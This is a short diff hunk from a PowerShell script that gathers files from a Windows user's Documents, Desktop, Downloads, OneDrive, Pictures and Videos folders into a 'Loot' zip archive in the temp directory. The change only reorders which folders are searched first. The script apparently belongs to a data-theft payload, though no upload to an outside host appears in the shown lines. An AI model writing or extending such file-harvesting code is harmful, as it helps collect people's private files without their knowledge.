@@ -15,7 +15,7 @@ $zipFilePath ="$env:temp/Loot$index.zip"
 If($Path -ne $null){
 $foldersToSearch = "$env:USERPROFILE\"+$Path
 }else{
-$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
+$foldersToSearch = @("$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos","$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive")
 }
 
 If($FileType -ne $null){
